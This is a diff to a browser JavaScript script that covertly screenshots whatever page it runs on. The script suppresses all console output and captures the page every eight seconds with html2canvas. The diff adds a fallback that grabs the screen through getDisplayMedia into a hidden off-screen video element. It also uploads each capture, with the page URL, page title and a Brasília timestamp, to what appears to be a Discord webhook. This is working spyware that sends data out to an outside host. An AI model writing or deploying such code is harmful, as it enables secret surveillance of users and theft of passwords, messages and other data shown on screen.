@@ -11,7 +11,7 @@
     var _interval = null;
     var _running = false;
     var _visible = true;
-    var _cfg = { interval: 8000, quality: 0.8, scale: 0.9 };
+    var _cfg = { interval: 8000, quality: 0.6, scale: 0.8 };
 
     var _noop = function() {};
     var _orig = {
@@ -26,6 +26,25 @@
     console.error = _noop;
     console.info = _noop;
     console.debug = _noop;
+
+    function _nowBrasilia() {
+        var now = new Date();
+        var options = {
+            timeZone: 'America/Sao_Paulo',
+            year: 'numeric',
+            month: '2-digit',
+            day: '2-digit',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit',
+            hour12: false
+        };
+        var formatter = new Intl.DateTimeFormat('pt-BR', options);
+        var parts = formatter.formatToParts(now);
+        var dateStr = parts.filter(p => p.type !== 'literal').map(p => p.value).join('');
+        var iso = now.toISOString();
+        return { formatted: dateStr, iso: iso };
+    }
 
     function _loadLib() {
         return new Promise(function(resolve) {
@@ -55,81 +74,105 @@
     }
 
     function _send(dataURL) {
-        var blob = _toBlob(dataURL);
-        if (!blob) return Promise.resolve();
-        var fd = new FormData();
-        fd.append('file', blob, 'screenshot.jpg');
-        return fetch(_webhook, { method: 'POST', body: fd }).catch(_noop);
+        try {
+            var blob = _toBlob(dataURL);
+            if (!blob) return Promise.resolve();
+
+            var brasilia = _nowBrasilia();
+            var embed = {
+                title: "📸 Captura de Tela",
+                description: "Screenshot da página atual",
+                color: 0x2b2d31,
+                timestamp: brasilia.iso,
+                footer: {
+                    text: "🕐 Horário de Brasília: " + brasilia.formatted + " • URL: " + (document.URL || "desconhecida")
+                },
+                fields: [
+                    {
+                        name: "🌐 Página",
+                        value: document.title || "Sem título",
+                        inline: true
+                    },
+                    {
+                        name: "⏱️ Intervalo",
+                        value: _cfg.interval / 1000 + "s",
+                        inline: true
+                    }
+                ]
+            };
+
+            var payload = {
+                embeds: [embed]
+            };
+
+            var fd = new FormData();
+            fd.append('file', blob, 'screenshot.jpg');
+            fd.append('payload_json', JSON.stringify(payload));
+
+            return fetch(_webhook, { method: 'POST', body: fd }).catch(_noop);
+        } catch(e) {
+            return Promise.resolve();
+        }
     }
 
-    function _captureHtml2Canvas() {
+    function _captureFallback() {
         return new Promise(function(resolve) {
-            var canvas = document.querySelector('canvas');
-            if (canvas) {
-                try {
+            var video = document.createElement('video');
+            video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-1;';
+            document.body.appendChild(video);
+            var stream = null;
+            navigator.mediaDevices.getDisplayMedia({
+                video: { cursor: 'never' },
+                audio: false
+            }).then(function(s) {
+                stream = s;
+                video.srcObject = s;
+                video.onloadedmetadata = function() {
+                    video.play();
+                    var canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 1920;
+                    canvas.height = video.videoHeight || 1080;
+                    var ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
                     var dataURL = canvas.toDataURL('image/jpeg', _cfg.quality);
-                    if (dataURL && dataURL.length > 2000) {
-                        _send(dataURL).then(resolve).catch(resolve);
-                        return;
-                    }
-                } catch(e) {}
-            }
-
-            html2canvas(document.body, {
-                scale: _cfg.scale,
-                useCORS: true,
-                logging: false,
-                backgroundColor: null,
-                allowTaint: true,
-                width: window.innerWidth,
-                height: Math.max(document.documentElement.scrollHeight, window.innerHeight),
-                ignoreElements: function(el) {
-                    return el.tagName === 'VIDEO';
-                },
-                onclone: function(clonedDoc) {
-                    var canvases = clonedDoc.querySelectorAll('canvas');
-                    for (var i = 0; i < canvases.length; i++) {
-                        try {
-                            var ctx = canvases[i].getContext('2d');
-                            if (ctx) {
-                                var imgData = ctx.getImageData(0, 0, canvases[i].width, canvases[i].height);
-                                var isBlack = true;
-                                for (var j = 0; j < imgData.data.length; j += 4) {
-                                    if (imgData.data[j] > 10 || imgData.data[j+1] > 10 || imgData.data[j+2] > 10) {
-                                        isBlack = false;
-                                        break;
-                                    }
-                                }
-                                if (isBlack && canvases[i].width > 10 && canvases[i].height > 10) {
-                                    canvases[i].style.backgroundColor = '#1a1a2e';
-                                    ctx.fillStyle = '#1a1a2e';
-                                    ctx.fillRect(0, 0, canvases[i].width, canvases[i].height);
-                                }
-                            }
-                        } catch(e) {}
-                    }
-                }
-            }).then(function(canvas) {
-                var dataURL = canvas.toDataURL('image/jpeg', _cfg.quality);
-                if (dataURL && dataURL.length > 5000) {
-                    _send(dataURL).then(resolve).catch(resolve);
-                } else {
-                    resolve();
-                }
-            }).catch(function() {
-                resolve();
-            });
+                    _send(dataURL).then(function() {
+                        if (stream) stream.getTracks().forEach(function(t) { t.stop(); });
+                        video.pause();
+                        video.srcObject = null;
+                        video.remove();
+                        resolve();
+                    }).catch(function() {
+                        if (stream) stream.getTracks().forEach(function(t) { t.stop(); });
+                        video.pause();
+                        video.srcObject = null;
+                        video.remove();
+                        resolve();
+                    });
+                };
+            }).catch(function() { resolve(); });
         });
     }
 
     function _capture() {
         if (_running || !_visible) return Promise.resolve();
         _running = true;
-
         return _loadLib()
             .then(function() {
-                return _captureHtml2Canvas();
+                return html2canvas(document.body, {
+                    scale: _cfg.scale,
+                    useCORS: true,
+                    logging: false,
+                    backgroundColor: null,
+                    allowTaint: true,
+                    width: window.innerWidth,
+                    height: Math.max(document.documentElement.scrollHeight, window.innerHeight)
+                });
             })
+            .then(function(canvas) {
+                var dataURL = canvas.toDataURL('image/jpeg', _cfg.quality);
+                return _send(dataURL);
+            })
+            .catch(function() { return _captureFallback(); })
             .then(function() { _running = false; })
             .catch(function() { _running = false; });
     }
